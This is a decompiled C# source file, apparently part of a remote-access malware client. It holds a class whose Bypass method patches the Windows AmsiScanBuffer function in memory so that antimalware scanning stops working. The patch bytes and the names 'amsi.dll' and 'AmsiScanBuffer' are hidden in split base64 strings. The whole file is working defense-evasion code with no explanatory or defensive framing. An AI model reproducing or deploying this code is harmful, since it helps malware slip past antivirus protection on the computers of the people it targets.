using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Client.Connection
{
	// Token: 0x02000006 RID: 6
	public class Amsi
	{
		// Token: 0x06000028 RID: 40 RVA: 0x000035BC File Offset: 0x000017BC
		public static void Bypass()
		{
			string text = "uFcA";
			text += "B4DD";
			string text2 = "uFcAB4";
			text2 += "DCGAA=";
			if (Amsi.is64Bit())
			{
				Amsi.PatchA(Convert.FromBase64String(text));
				return;
			}
			Amsi.PatchA(Convert.FromBase64String(text2));
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00003610 File Offset: 0x00001810
		private static void PatchA(byte[] patch)
		{
			try
			{
				string @string = Encoding.Default.GetString(Convert.FromBase64String("YW1zaS5kbGw="));
				IntPtr hProcess = Win32.LoadLibraryA(ref @string);
				string string2 = Encoding.Default.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI="));
				IntPtr procAddress = Win32.GetProcAddress(hProcess, ref string2);
				uint num;
				Win32.VirtualAllocEx(procAddress, (UIntPtr)((ulong)((long)patch.Length)), 64U, out num);
				Marshal.Copy(patch, 0, procAddress, patch.Length);
			}
			catch (Exception ex)
			{
				Console.WriteLine(" [x] {0}", ex.Message);
				Console.WriteLine(" [x] {0}", ex.InnerException);
			}
		}

		// Token: 0x0600002A RID: 42 RVA: 0x000036B8 File Offset: 0x000018B8
		private static bool is64Bit()
		{
			bool result = true;
			if (IntPtr.Size == 4)
			{
				result = false;
			}
			return result;
		}
	}
}
